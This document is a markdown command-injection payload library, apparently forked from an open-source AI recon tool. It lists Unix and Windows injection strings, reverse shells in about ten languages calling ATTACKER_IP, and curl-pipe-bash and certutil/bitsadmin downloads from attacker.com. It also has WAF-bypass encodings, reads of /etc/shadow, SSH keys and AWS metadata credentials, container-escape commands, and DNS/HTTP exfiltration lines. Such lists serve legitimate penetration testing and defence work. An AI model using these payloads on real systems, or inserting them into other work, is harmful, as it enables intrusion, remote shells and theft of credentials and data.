<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

# Full Command Injection Payload Library

## Unix/Linux Command Injection

### Basic Payloads
```
;id
|id
&id
&&id
|id;id
||id
; ls
| ls
& ls
&& ls
|ls
||ls
`id`
$(id)
${IFS}id
;id
%0aid
\nid
 id
;id
```

### Blind Injection
```
; sleep 5
| sleep 5
& sleep 5
&& sleep 5
|| sleep 5
; sleep 5 #
;ping -c 5 127.0.0.1
;mkfifo /tmp/pipe;sh /tmp/pipe | nc attacker.com 4444 | /bin/sh >/tmp/pipe
```

### Time-Based Blind
```
; sleep 5
& sleep 5
| sleep 5
&& sleep 5
|| sleep 5
; sleep 5 --
; sleep 5 #
```

### Reverse Shell Payloads

### Bash Reverse Shell
```
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
exec /bin/sh 0<&2 1>&2
/bin/sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

### Netcat Reverse Shell
```
nc -e /bin/sh ATTACKER_IP PORT
nc -e /bin/bash ATTACKER_IP PORT
nc -c /bin/sh ATTACKER_IP PORT
/bin/nc ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

### Python Reverse Shell
```
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python -c "import os;os.system('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1')"
```

### Perl Reverse Shell
```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
perl -e "exec qq{/bin/sh -i} if fork"
```

### PHP Reverse Shell
```
php -r '$s=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("ATTACKER_IP",PORT);$d="/bin/sh -i";$p=proc_open($d,array(0=>$s,1=>$s,2=>$s),$pipes);'
<?php system("bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1");?>
<?php exec("bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1");?>
<?php shell_exec("bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1");?>
<?php passthru("bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1");?>
```

### Ruby Reverse Shell
```
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e'p=Process.spawn("/bin/sh -i <&3 >&3 2>&3");f=TCPSocket.new("ATTACKER_IP","PORT");f.fcntl(Fcntl::F_SETFD,Fcntl::FD_CLOEXEC);'
```

### Node.js Reverse Shell
```
node -e "var net = require('net'), cp = require('child_process'), sh = cp.spawn('/bin/sh', []); var client = new net.Socket(); client.connect(PORT, 'ATTACKER_IP', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});"
```

### Telnet Reverse Shell
```
telnet ATTACKER_IP PORT | /bin/sh | telnet ATTACKER_IP PORT2
```

### PowerShell Reverse Shell
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -gt 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$p = (new-object System.Diagnostics.Process);$p.StartInfo = New-Object System.Diagnostics.ProcessStartInfo('cmd.exe');$p.StartInfo.RedirectStandardInput = $true;$p.StartInfo.RedirectStandardOutput = $true;$p.StartInfo.RedirectStandardError = $true;$p.StartInfo.UseShellExecute = $false;$p.Start();$p.StandardInput.WriteLine($d);$o = $p.StandardOutput.ReadToEnd();$c.Close();}"
```

### Curl/Wget to Upload
```
curl http://attacker.com/shell.sh | bash
wget -O- http://attacker.com/shell.sh | bash
```

### Socat Reverse Shell
```
socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT
```

### GCHQ Payloads
```
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKER_IP PORT 0/tmp/p
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Windows Command Injection

### Basic Payloads
```
;whoami
&whoami
&&whoami
|whoami
||whoami
%0Awhoami
%0Dwhoami
%00whoami
cmd /c whoami
cmd /c "whoami"
```

### PowerShell Payloads
```
powershell -Command "whoami"
powershell -c "whoami"
powershell.exe -NoP -NonI -W Hidden -Command "whoami"
powershell -e "cABhAHMAcAA="
```

### SMB Relay
```
\\\\attacker.com\\share\\payload.exe
\\attacker.com\share\payload.exe
```

### MSHTA
```
mshta vbscript:Execute("CreateObject("WScript.Shell").Run("cmd /c whoami"):Close")
mshta javascript:Close(Execute("CreateObject("WScript.Shell").Run("cmd /c whoami")"))
```

### Certutil
```
certutil -urlcache -f http://attacker.com/payload.exe payload.exe
certutil -decode payload.b64 payload.exe
```

### Bitsadmin
```
bitsadmin /transfer download http://attacker.com/payload.exe %TEMP%\payload.exe
```

### WebDAV
```
copy \\attacker.com\share\payload.exe %TEMP%\payload.exe
```

## WAF Bypass Techniques

### Whitespace Bypass
```
id%0A
id%0D
id%09
id%0bid%0aid%0c
id%00
id|ls
id;ls
id&&ls
id||ls
```

### Character Insertion
```
i\x64
w\x68\x6f\x61\x6d\x69
```

### Encoding
```
echo YWRtaW4= | base64 -d
echo 6964 | xxd -r -p
printf '\x69\x64'
```

### Variable Substitution
```
$(echo $((7*7)))
`echo $((7*7))`
```

### Random Case
```
I\x64
WHOAMI
who\x61mi
```

## Path Traversal in Commands
```
;cat /etc/passwd
;cat ../../../../etc/passwd
;cat ..//..//..//..//etc/passwd
;cat /etc/../etc/passwd
;cat /etc/passwd/../../etc/passwd
```

## Environment Variables
```
;echo $PATH
;echo $HOME
;echo $USER
;echo $PWD
;env
;printenv
;set
```

## File Operations
```
;ls -la /
;ls -la /var/www/html
;ls -la /tmp
;cat /etc/passwd
;cat /etc/shadow
;cat /etc/hosts
;touch /tmp/test
;mkdir /tmp/test
;rm -rf /tmp/test
;cp /etc/passwd /tmp/passwd
;mv /etc/passwd /tmp/passwd
```

## Network Enumeration
```
;ifconfig
;ip addr
;netstat -an
;ss -tulpn
;arp -a
;route -n
;hostname -I
```

## Process Enumeration
```
;ps aux
;ps -ef
;top -n 1
;lsof -i
```

## Service Exploitation
```
;systemctl status ssh
;service ssh status
;service --status-all
```

## Database Connection
```
;mysql -u root -p -e "SELECT * FROM users;"
;psql -U postgres -c "SELECT * FROM users;"
;mongo --eval "db.users.find()"
;sqlite3 database.db ".tables"
```

## sudo Exploitation
```
;sudo -l
;sudo su
;sudo bash
```

## Cron Jobs
```
;crontab -l
;ls -la /etc/cron.d/
;ls -la /etc/cron.daily/
;ls -la /etc/cron.hourly/
```

## SSH Keys
```
;ls -la ~/.ssh/
;cat ~/.ssh/id_rsa
;cat ~/.ssh/authorized_keys
```

## Kernel Exploits
```
;uname -a
;cat /proc/version
;lsb_release -a
```

## Docker Breakout
```
;docker ps
;docker images
;docker inspect container_id
;docker exec container_id cat /etc/passwd
```

## Container Escape
```
;docker run --rm -v /:/host alpine chroot /host
;docker cp container_id:/etc/passwd /tmp/passwd
```

## AWS Metadata
```
;curl http://169.254.169.254/latest/meta-data/
;curl http://169.254.169.254/latest/user-data/
;wget -O- http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Git Exploitation
```
;git log
;git show
;git diff
;cat .git/config
;ls -la .git/
```

## Backup Files
```
;ls -la *.bak
;ls -la *.old
;ls -la *.swp
;ls -la *~
```

## Interesting Files
```
;cat /etc/httpd/conf/httpd.conf
;cat /etc/apache2/apache2.conf
;cat /etc/nginx/nginx.conf
;cat /etc/mysql/my.cnf
;cat /etc/postgresql/posgresql.conf
```

## Injection Points

### URL Parameter
```
/?q=;id
/search?q=||id
/page?id=1;id
/file?name=;id
```

### Header
```
X-Forwarded-Host:;id
User-Agent:;id
Referer:;id
Cookie:id=;id
```

### POST Data
```
name=test;id
cmd=;id
data=;id
```

### JSON
```
{"cmd":";id"}
{"file":";id"}
```

### XML
```
<cmd>;id</cmd>
<file>;id</file>
```

## Obfuscation

### Base64
```
;echo YWRtaW4= | base64 -d
;bash<<<$(echo YWRtaW4= | base64 -d)
```

### Hex
```
;echo 6964 | xxd -r -p
;printf '\x69\x64'
```

### URL Encoding
```
%3b%69%64
%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64
```

### Double Encoding
```
%253b%2569%2564
```

## Blind Command Injection

### DNS Exfiltration
```
;nslookup $(whoami).attacker.com
;curl http://attacker.com/$(whoami)
;wget http://attacker.com/$(whoami)
```

### Time-Based
```
;ping -c 5 127.0.0.1
;sleep 5
;timeout 5
```

### Output Extraction
```
;cat /etc/passwd > /tmp/out.txt
;curl -X POST -d @/tmp/out.txt http://attacker.com
;wget --post-file=/tmp/out.txt http://attacker.com
```
